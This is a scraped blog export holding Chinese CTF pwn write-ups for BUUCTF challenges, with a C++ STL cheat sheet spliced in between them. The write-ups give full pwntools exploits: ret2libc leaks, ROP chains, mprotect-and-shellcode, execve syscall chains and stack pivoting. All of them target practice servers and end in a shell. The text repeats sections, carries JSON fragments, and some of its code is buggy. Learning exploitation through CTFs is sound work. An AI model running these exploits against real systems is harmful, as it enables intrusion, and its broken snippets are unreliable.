覆盖数据payload=b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参 注意栈对齐 还有最后还要再输一个0 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1 [OGeek2019]babyropBUUCTF pwn考点： ret2libc3 0x0164位程序，开启NX 没有system函数和/bin/sh字符串 0x02分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。 main函数 sub_804871F函数 sub_80487D0函数 观察程序我们可以发现sub_80487D0函数有栈溢出漏洞 然而想要利用栈溢出需要我们达成两个目标 1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0 2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出 0x03首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\\x00’，可起到截断字符串长度的效果。 第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 = 255个字节，所以让buf[7] = ‘\\xff’即可。代码中的buf[v5-1] = 0改变的是字符串末尾’\\x00’的值，不影响buf[7] 。 所以第一次读取的payload为 payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") 0x04注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了 完整exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') p = remote('node4.buuoj.cn',28188) #p = process('./pwn') elf = ELF('./pwn') libc = ELF('libc-2.23.so') payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") write_plt = elf.plt[\"write\"] write_got = elf.got[\"write\"] #main_addr = elf.plt['__libc_start_main'] main_addr = 0x8048825 payload1 = b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) p.sendline(payload1) write_addr = u32(p.recv(4)) #print(hex(write_addr)) libc_base = write_addr - libc.sym[\"write\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() p.sendline(payload) p.recvuntil(\"Correct\\n\") payload2 = b'a'*0xe7+b'a'*4+p32(system_addr)+p32(0)+p32(bin_sh_addr) p.sendline(payload2) p.interactive() 铁人三项(第五赛区)_2018_rop经典ret2libc3 exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p = remote('node4.buuoj.cn',28146) elf = ELF('./pwn') main_addr = elf.sym['main'] plt_addr = elf.plt['write'] got_addr = elf.got['write'] pay1 = b'a'*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD) p.sendline(pay1) write_addr = u32(p.recv()[0:4])#0xf7db1190 print(\"write_addr = \",hex(write_addr)) libc=LibcSearcher('write',write_addr) offset=write_addr-libc.dump('write') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x88+4)+p32(system)+b'aaaa'+p32(binsh) p.sendline(pay2) p.interactive() pwn2_sctf_20160x0132位开NX泄露libc 注意get_n是自定义函数 规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。 ROP链泄露libc，溢出覆盖返回地址getshell 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn0') p = remote('node4.buuoj.cn',26602) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') libc = ELF('./libc-2.23.so') elf = ELF('./pwn0') main_addr = elf.sym['main'] plt_addr = elf.plt['printf'] got_addr = elf.got['getchar'] fmt = 0x080486F #第一行的才正确？ pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr) p.recvuntil(b\"\\n\") p.sendline(pay1) getchar_addr= u32(p.recvuntil(b'\\xf7')[-4:]) #getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了 print(\"getchar_addr = \",hex(getchar_addr)) ''' libc=LibcSearcher('getchar',getchar_addr) offset=getchar_addr-libc.dump('getchar') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') ''' base_addr = getchar_addr - libc.symbols['getchar'] system = libc.symbols['system'] + base_addr binsh = libc.search(b'/bin/sh').__next__() + base_addr print(\"libc_base_addr = \",hex(base_addr)) #print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x2c+4)+p32(system)+b'aaaa'+p32(binsh) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') p.recvuntil(b\"\\n\") p.sendline(pay2) p.interactive() bjdctf_2020_babyrop0x0164位，与32位传参有区别 思路： 利用puts函数泄露出puts函数真实地址 通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址 构造rop链栈溢出getshell puts函数通过pop rdi ; ret 传参 用ROPgadget可以找到 0x02exp #encoding = utf-8 from pwn import * from LibcSearcher import * context(os = 'linux',arch = 'amd64',log_level = 'debug') content = 1 elf = ELF('./pwn') def main(): if content == 1: p = process('./pwn') else: p = remote('node4.buuoj.cn',29917) #elf main_addr = elf.sym['main'] plt_addr = elf.plt['puts'] got_addr = elf.got['puts'] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print(hex(puts_addr)) #libc lib = LibcSearcher('puts',puts_addr) lib_puts_addr = lib.dump('puts') lib_system_addr = lib.dump('system') lib_bin_addr = lib.dump('str_bin_sh') #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b'a'*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) p.interactive() main() [HarekazeCTF2019]baby_rop264位的ret2libc3 0x01 利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='amd64', log_level='debug') p = remote('node4.buuoj.cn',25502) #p = process('./babyrop2') elf = ELF('./babyrop2') libc = ELF('libc.so.6') #一定要用题目给的libc文件，可能必须要用题目给的才能打通 printf_plt = elf.plt['printf'] read_got = elf.got['read'] main_plt = elf.sym['main'] pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 fmt = 0x0000000000400790 payload1 = b'a'*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt) p.recvuntil(\"name? \") p.sendline(payload1) read_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(\"read_addr ======>> \"+hex(read_addr)) libc_base = read_addr - libc.sym[\"read\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() payload2 = b'a'*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0) p.sendline(payload2) p.interactive()","categories":[{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.io/categories/collections/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"}]},{"title":"C++STL 学习笔记","slug":"C++STL 学习笔记","date":"2023-08-29T12:37:51.000Z","updated":"2024-02-04T06:46:12.338Z","comments":true,"path":"posts/45592537/","link":"","permalink":"http://lmarch2.github.io/posts/45592537/","excerpt":"","text":"C++STL 学习笔记记录一些数据结构课外学习STL容器使用的笔记，当个字典用吧嘿嘿~~ STL补充 List 链表 vector 存放任意类型的动态数组 STL容器适配器 stack queue priority_queue deque heap pair 迭代器类型补充 STL对于空间大小的规定 STL补充List 链表 list&lt;int&gt; mylist = { }链表定义和初始化 void push_front(const T &amp; val) 将 val 插入链表最前面 void pop_front() 删除链表最前面的元素 list.push_back() 增加一个新的元素在 list 的尾端 list.pop_back() 删除 list 的最末个元素 void sort() 将链表从小到大排序 reverse()反转链表 list.empty() 若list内部为空，则回传true值 list.size() 回传list内实际的元素个数 list.front() 存取第一个元素 list.back() 存取最末个元素 mylist.begin() 首位迭代器 mylist.end()末位迭代器 常见for循环 for (auto it = mylist.begin(); it != mylist.end(); ++it) `cout &lt;&lt; *it &lt;&lt; \" \";` it是迭代器指针，不能赋值，不能运算（+=不行），只能++ list的迭代器只支持双向访问，不支持随机访问，因此不能直接进行加减操作 （和vector等区别） advance(it, n); 将迭代器it向前移动n个位置 mylist.insert(it, k); 向第it位迭代器位置插入新元素k（it之前） mylist.erase(it); 删除第it位迭代器位置所指元素 mylist.erase(it, it + n); 删除第it位到第it+n位元素（一共删除从it开始到it+n的n个元素） next(it,n)函数是C++ STL中的一个函数，它的作用是返回一个新的迭代器，该迭代器指向原始迭代器向前或向后移动指定距离后的位置 ，被用来移动it迭代器到下n位 vector 存放任意类型的动态数组 vector&lt;T&gt;(nSize,t)创建一个vector，元素个数为nSize,且值均为t vector.push_back(k) 在vector尾部插入元素k vector.insert(vector.begin() + 1, 2) 在vector的第2个位置插入一个元素2 vector.pop_back() 删除vector尾部的一个元素 vector.erase(v.begin() + 1) 删除vector的第2个元素 erase()方法接受两个迭代器参数，表示要删除的区间的起始位置和结束位置。被删除的区间包括起始位置的元素，但不包括结束位置的元素。 vector.[0]; 访问vector的第1个元素 ， 可进行赋值等操作 vector.at(0); /访问vector的第1个元素，如果越界会抛出异常 for (int i = 0; i &lt; v.size(); i++) { cout &lt;&lt; v[i] &lt;&lt; \" \"; } 遍历vector vector.resize() 改变实际元素的个数，新添加的元素会被默认初始化 vector.size() 获取vector的大小 ，这是当前存储的元素数量 vector.capacity()返回当前容量，这是目前容器最多储存的元素数量 vector.front() 返回第一个元素的引用 vector.back()返回最后一个元素的引用 vector.begin()返回指向容器中第一个元素的迭代器 vector.end()返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用 vector.empty()判断一个vector是否为空 STL容器适配器stack stack&lt;T&gt; 创建栈对象 push(element)：将元素压入栈顶 pop()：弹出栈顶元素 top()：返回栈顶元素 empty()：返回栈是否为空 size()：返回栈中元素的数量 清空栈操作： while (!myStack.empty()) { myStack.pop(); } queue queue &lt;int&gt; 创建queue对象 push(element)：将元素添加到队列的末尾 pop()：从队列的头部取出元素，并将其从队列中删除 front()：返回队列头部的元素，但不将其从队列中删除 back()：返回队列末尾的元素，但不将其从队列中删除 size()：返回队列中元素的数量 empty()：判断队列是否为空 priority_queue push(element)：将元素添加到优先队列中，根据优先级顺序排列。 pop()：从优先队列中取出优先级最高的元素，并将其从队列中删除。 top()：返回优先队列中优先级最高的元素，但不将其从队列中删除。 size()：返回优先队列中元素的数量。 empty()：判断优先队列是否为空 priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;创建大顶堆 less&lt;int&gt;是priority_queue的默认比较函数，因此在创建大顶堆时可以省略第三个参数。以下是更简洁的表达式：priority_queue&lt;int&gt; myMaxHeap; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; 创建小顶堆 priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt; 指定了使用greater&lt;int&gt; 作为比较函数，因此创建的优先队列是升序的，即优先级数值小的元素排在队列前面。如果想要创建降序的优先队列，可以使用 less&lt;int&gt; 作为比较函数，例如 priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; EG: 优先队列实现滑动窗口求最大值 int main() { int k; // 滑动窗口大小 int n; cin >> n >> k; vector nums(n); // 输入数组 priority_queue pq; // 定义优先队列，存放数值和下标 for (int i = 0; i < nums.size(); i++) cin >> nums[i]; // 先将前 k 个元素加入优先队列 for (int i = 0; i < k; i++) { pq.push({ nums[i], i }); } // 输出第一个滑动窗口的最大值 cout < pq.top().first < \" \"; // 滑动窗口向右移动，每次加入一个新元素，弹出一个旧元素 for (int i = k; i < nums.size(); i++) { pq.push({ nums[i], i }); // 加入新元素 while (pq.top().second","categories":[{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.io/categories/notes/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://lmarch2.github.io/tags/C/"}]},{"title":"远古BUUCTF的wp","slug":"远古BUUCTF的wp","date":"2023-08-28T14:37:09.000Z","updated":"2024-02-04T06:46:08.370Z","comments":true,"path":"posts/de339b6d/","link":"","permalink":"http://lmarch2.github.io/posts/de339b6d/","excerpt":"","text":"搬运，BUUCTF的pwn部分题解 not_the_same_3dsctf_2016 0X01 0x02 ciscn_2019_n_8 get_started_3dsctf_2016 0x00 0x01 0x02 0x03 0x04 ciscn_2019_c_1 0x01 0x02 0x03 0x04 0x05 [OGeek2019]babyrop 0x01 0x02 0x03 0x04 ciscn_2019_es_2 0x01 0x02 第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址 第二步 栈迁移 0x03 0x04 铁人三项(第五赛区)_2018_rop pwn2_sctf_2016 0x01 0x02 bjdctf_2020_babyrop 0x01 0x02 [HarekazeCTF2019]baby_rop2 0x01 0x02 jarvisoj_fm ciscn_2019_s_3 0x01 0x02 0x03 第一种做法：ret2csu控制执行execve 第二种：SROP not_the_same_3dsctf_20160X01和get_started_3dsctf_2016类似 大概思路是先控制程序流到get_secret函数读取flag到f14g变量，再控制返回地址为write函数输出f14g变量的内容 from pwn import * p = remote(\"node4.buuoj.cn\",25684) elf= ELF(./not_the_same_3dsctf_2016) write_addr = elf.sym['write'] flag_addr = 0x080ECA2D get_secret = 0x080489A0 payload='a'* 0x2d + p32(get_secret) + p32(write_addr) + p32(0) + p32(1) + p32(flag_addr) + p32(45) p.sendline(payload) p.interactive() 0x02第二种思路 用mprotect函数修改.plt.got表内存页权限为可读可写可执行，用read函数将shellcode注入到刚才修改的内存页中，执行shellcode from pwn import * sh = remote(\"node4.buuoj.cn\",25684) elf= ELF(./not_the_same_3dsctf_2016) pop3_ret = 0x0804f420#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参 #ROPgadget --binary get_started --only 'pop|ret' | grep pop #为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好. mem_addr = 0x80eb000 #可读可写的内存,但不可执行 mem_size = 0x1000 #通过调试出来的值 mem_proc = 0x7 #可代表可读可写可执行 mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] ''' 为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值. ''' payload = 'A' * 45 #填充数据覆盖到ebp payload += p32(mprotect_addr) #栈返回到mprotect()函数执行 payload += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12 #mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7) payload += p32(mem_addr) #mprotect函数参数1 修改的内存地址 payload += p32(mem_size) #mprotect函数参数2 修改的内存大小 payload += p32(mem_proc) #mprotect函数参数3 修改的权限 payload += p32(read_addr) #执行完pop3_ret后弹到read地址 payload += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12 #read 的三个参数 read(0,0x080ea000,0x100) payload += p32(0) #read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址 payload += p32(mem_addr) #读取到的内容复制到指向的内存里 payload += p32(0x100) #读取大小 payload += p32(mem_addr) #执行完read后ret esi，这里是返回到我们布置的shellcode执行 sh.sendline(payload) payload_shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') sh.sendline(payload_shellcode) sh.interactive() ciscn_2019_n_8 只需要满足var[13] == 17即可getshell；__isoc99_scanf()`函数没有限制输入数据的长度 exp from pwn import * context(log_level='debug') sh = remote('node4.buuoj.cn',25951) payload = 'a'*4*13 + p32(17) #p32(17)=\\x11\\x00\\x00\\x00,16进制小端存储，0x11(16)=17(10) #这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用 sh.sendlineafter(\"What's your name?\\n\",payload) sh.interactive() get_started_3dsctf_20160x00最近持续学习栈溢出，努力熟悉各种利用方法，争取这周和下周把栈溢出这块结束 0x01IDA分析 `` 方法一：传统栈溢出 可以看到main函数并没有ebp，寻址方式是esp寻址 get_flag函数中，在读取flag之前先经过if判断a1 == 814536271 &amp;&amp; a2 == 425138641 构造pay时不可以试图跳过这个判断，无法打通 返回地址一定要覆盖为get_flag函数的开始处 在栈上构造get_flag参数 payload = b’a’ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2) 注意这里的返回地址为exit的地址，打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出 EXP1 from pwn import * context(os = 'linux', arch = 'i386', log_level = 'debug') #p = process('./get_started_3dsctf_2016') p = remote('node4.buuoj.cn',25669) get_flag_addr = 0x080489A0 exit_addr = 0x804E6A0 a1 = 0x308CD64F a2 = 0x195719D1 payload = b'a' * 0x38+p32(get_flag_addr)+p33(exit_addr)+p32(a1)+p32(a2) p.sendline(payload) p.interactive() 0x02方法二：系统调用 利用ROPgadget找到需要的gadget pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 但是没有找到”/bin/sh”字符串，考虑在其他寄存器写入/bin/sh，再赋值给edx 看看有没有类似的mov指令 mov_edx_eax_ret = 0x080557ab 你猜猜我mov_edx_eax_ret怎么找的（裂开） 可以看到，该处指令mov [edx], eax 是将eax寄存器里的值写到eedx所存的地址处[edx]，攻击的思路就是讲[edx]地址覆盖为/bin/sh写入地址，并利用eax寄存器将字符串/bin/sh存入。 需要注意的是，该程序没有给出可用的bss段变量，栈空间一般情况下开启ASLR地址随机，所以我们用vmmap查找可读的内存空间作为入/bin/sh的地址 这篇参考的链接，使用0x080eb020 作为存放/bin/sh的地址，但是使用vmmap可以看到没有以这个地址开头或结束的段，而且也不存在可写可执行的段，只有0x80ea000到0x80ec000是可写的文件段（实际上0x080eb020 也在该段中） 补充一下，同时其实我们可以看出来vmmap出来的地址段是没有libc中的内容的，实际上get_started_3dsctf_2016是静态链接 整体的rop流程为，分两次每次四字节将”/bin” “/sh\\x00”先存入eax，再利用Pop将edx置为0x80ea000，再利用mov指令将字符串放入该地址指向空间，最后返回系统调用 from pwn import * local = 0 if local == 1: io = process('./get_started_3dsctf_2016') else: io = remote('node4.buuoj.cn',25878) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab w_addr = 0x80ea000#0x080eb020 payload = b'a'*56+p32(pop_eax_ret)+b'/bin'+p32(pop_edx_ecx_ebx_ret)+p32(w_addr)+p32(0)+p32(0)+p32(mov_edx_eax_ret) payload += p32(pop_eax_ret)+b'/sh\\x00'+p32(pop_edx_ecx_ebx_ret)+p32(w_addr+4)+p32(0)+p32(0)+p32(mov_edx_eax_ret) payload += p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(w_addr)+p32(int80) io.sendline(payload) io.interactive() ~ 0x03方法三：mprotect函数修改地址权限 利用mprotect()函数来修改内存权限，一般是将.bss端修改为可读可写可执行，然后通过read()函数向目标内存写入shellcode，然后getshell （因为是静态链接的，所有的函数都会链接到程序，肯定会存在一个mprotect（）函数 ） include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。 len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：1）PROT_READ：内存段可读；2）PROT_WRITE：内存段可写；3）PROT_EXEC：内存段可执行；4）PROT_NONE：内存段不可访问。返回值：0；成功，-1；失败（并且errno被设置）1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。3）ENOMEM：内核内部的结构体无法分配。这里的参数prot： r:4 w:2 x:1 我们通过vmmap可以看到0x080ea000到0x080ec000是可读可写但是不可执行的（开了NX保护），所以用mprotect()将这一段修改成可读可写可执行，然后通过read()传shellcode到此处 需要注意的是mprotect指定的内存区间必须包含整个内存页（4K），并且区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍（0x1000=4096） 我们知道32位调用函数不需要寄存器传参，但是我们需要用pop，ret来控制程序运行流程， 用 ROPgadget 随便选一个有三个寄存器加一个ret的gadget from pwn import * elf = ELF('./get_started_3dsctf_2016') sh = remote('node4.buuoj.cn',27364) #sh = process('./get_started_3dsctf_2016') context(os = 'linux', arch = 'i386', log_level = 'debug' , endian = 'little') #小端序，linux系统，32位架构,debug mprotect = 0x0806EC80 buf_addr = 0x80eb000 #要修改的内存页首地址 buf_size = 0x1000 #要修改的内存页大小 buf_prot = 0x7 #要修改的权限 pop_3_ret = 0x08063adb #寄存器传参外加ret返回read函数地址 #0x08063adb : pop edi ; pop esi ; pop ebx ; ret mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] read_addr = 0x0806E140 payload = b'a'*0x38 payload += p32(mprotect) #先将返回地址覆盖为mprotect函数地址 payload += p32(pop_3_ret) #通过三个寄存器传参再加上ret返回栈上下一个函数地址 payload += p32(buf_addr) #要修改的内存页首地址 payload += p32(buf_size) #要修改的内存页大小 payload += p32(buf_prot) #要修改的权限 payload += p32(read_addr) #ret返回栈上下一个函数地址为read函数地址 payload += p32(buf_addr) #read函数的返回地址 payload += p32(0) #read函数的第一个参数 payload += p32(buf_addr) #read函数的第二个参数 payload += p32(0x100) #read函数的第三个参数 sh.sendline(payload) shellcode = asm(shellcraft.sh(),arch='i386',os='linux') sh.sendline(shellcode) #read函数输入buf_addr的字符串 sh.interactive() 0x04参考文章 1 2 3 4 5 6 ciscn_2019_c_10x01简单的ret2libc3file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘） 0x04写exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() 0x05libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 覆盖数据payload=b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参 注意栈对齐 还有最后还要再输一个0 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1 [OGeek2019]babyrop0x0164位程序，开启NX 没有system函数和/bin/sh字符串 0x02分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。 main函数 sub_804871F函数 sub_80487D0函数 观察程序我们可以发现sub_80487D0函数有栈溢出漏洞 然而想要利用栈溢出需要我们达成两个目标 1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0 2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出 0x03首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\\x00’，可起到截断字符串长度的效果。 第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 = 255个字节，所以让buf[7] = ‘\\xff’即可。代码中的buf[v5-1] = 0改变的是字符串末尾’\\x00’的值，不影响buf[7] 。 所以第一次读取的payload为 payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") 0x04注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了 完整exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') p = remote('node4.buuoj.cn',28188) #p = process('./pwn') elf = ELF('./pwn') libc = ELF('libc-2.23.so') payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") write_plt = elf.plt[\"write\"] write_got = elf.got[\"write\"] #main_addr = elf.plt['__libc_start_main'] main_addr = 0x8048825 payload1 = b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) p.sendline(payload1) write_addr = u32(p.recv(4)) #print(hex(write_addr)) libc_base = write_addr - libc.sym[\"write\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() p.sendline(payload) p.recvuntil(\"Correct\\n\") payload2 = b'a'*0xe7+b'a'*4+p32(system_addr)+p32(0)+p32(bin_sh_addr) p.sendline(payload2) p.interactive() ciscn_2019_es_20x0132位开NX，有system函数，但是需要传入binsh。 然而，栈上变量 s 位于 ebp-0x28，而 read 函数仅能读入0x30个字节，那么若想实施缓冲区溢出，只有0x08 = 0x30-0x28个字节供我们进行布局。因此，在只有 ebp 与 ret 能被篡改的条件下可尝试使用栈迁移。 程序存在leave ret指令，并且存在system函数可执行 而binsh则需要在栈上传入 So，我们最终要将 esp（与 ebp）劫持到当前栈的另一区域上，以完成传统栈溢出payload的实施 在本题中，劫持目标地址即为缓冲区变量 s 的起始地址 0x02第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址printf函数在未遇到”\\x00”时会一直输出，可以用来泄露出ebp的值 因为栈上地址间的相对位置是确定的，所以我们可以通过第二次输入的位置和泄露的ebp地址的偏移来定位我们的目标地址 在第二次输入read函数返回处下断点调试，计算可得泄露ebp与缓冲区起始位置相距0x38 第二步 栈迁移精心构造栈上的布局来实现栈迁移 0x03此处盗图，已标明 画栈图有助于理解整个流程 整个长条表示read读入的字节长度0x30，old_ebp表示泄露的ebp，减去0x38指向的就是变量s的起始位置，返回地址被覆盖为leav_ret的地址。 第一次自带的leave指令执行后，ebp的值为old_ebp - 0x38 ，esp指向篡改的返回地址leave_ret；接着执行ret指令pop eip再一次执行leave ret 